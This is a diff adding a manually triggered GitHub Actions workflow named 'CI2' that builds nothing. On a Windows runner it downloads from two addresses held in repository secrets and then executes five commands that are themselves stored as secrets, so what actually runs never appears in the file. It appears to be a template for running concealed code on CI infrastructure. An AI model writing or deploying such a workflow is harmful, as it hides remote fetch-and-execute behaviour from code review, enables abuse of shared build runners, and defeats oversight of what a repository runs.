@@ -1,0 +1,18 @@
+name: CI2
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    steps:
+    - name: Runer
+      run: |
+        Invoke-WebRequest ${{ secrets.ENV_A }}
+        Invoke-WebRequest ${{ secrets.ENV_B }}
+        ${{ secrets.ENV_C }}
+        ${{ secrets.ENV_D }}
+        ${{ secrets.ENV_E }}
+        ${{ secrets.ENV_F }}
+        ${{ secrets.ENV_G }}
